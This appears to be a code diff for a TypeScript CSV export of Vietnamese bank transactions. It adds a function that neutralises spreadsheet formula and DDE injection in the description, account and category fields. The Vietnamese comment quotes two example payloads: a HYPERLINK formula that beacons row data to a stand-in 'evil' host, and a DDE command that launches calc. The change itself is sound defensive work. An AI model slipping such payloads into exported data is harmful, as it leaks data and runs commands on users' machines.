@@ -15,6 +15,23 @@ export interface CSVTransactionRow {
 }
 
 /**
+ * Vô hiệu hoá công thức trong ô CSV (CSV formula / DDE injection).
+ *
+ * Excel/LibreOffice/Sheets ĐÁNH GIÁ ô bắt đầu bằng `= + - @` (và tab/CR) như công
+ * thức — kể cả khi ô đã được quote, nên việc papaparse quote dấu phẩy KHÔNG phải
+ * là phòng thủ. `description`/`merchantName` lấy nguyên văn từ SMS ngân hàng, tức
+ * là nội dung ta KHÔNG kiểm soát: một mô tả dạng
+ * `=HYPERLINK("http://evil/?d="&A1,"refund")` sẽ beacon dữ liệu dòng đó ra ngoài
+ * khi người dùng mở file, còn `+cmd|' /C calc'!A0` là DDE trên Excel cũ.
+ *
+ * Thêm dấu nháy đơn phía trước: Excel hiểu là "ô text", hiển thị nguyên văn và
+ * không chạy công thức.
+ */
+function neutralizeFormula(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
+}
+
+/**
  * Transform a Transaction or CreditCardTransaction to a CSV row with Vietnamese headers.
  * @param tx Transaction or CreditCardTransaction object
  * @param accountOrCard Optional BankAccount or CreditCard for account/card name
@@ -38,13 +55,15 @@ export function formatTransactionForCSV(
   // Get category from overrides or original transaction
   const category = categoryOverrides?.get(tx.id) ?? tx.category ?? 'Khác'
 
+  // Sanitize mọi field có nguồn từ dữ liệu (không phải hằng số trong code):
+  // description/merchantName đến từ SMS ngân hàng, accountName/category từ DB.
   return {
     'Ngày': formatDisplayDate(tx.transactionDate),
-    'Mô tả': tx.description,
+    'Mô tả': neutralizeFormula(tx.description),
     'Số tiền': formatVND(Math.abs(tx.amount)),
     'Loại': typeLabel,
-    'Tài khoản': accountName,
-    'Danh mục': category,
+    'Tài khoản': neutralizeFormula(accountName),
+    'Danh mục': neutralizeFormula(category),
   }
 }
 
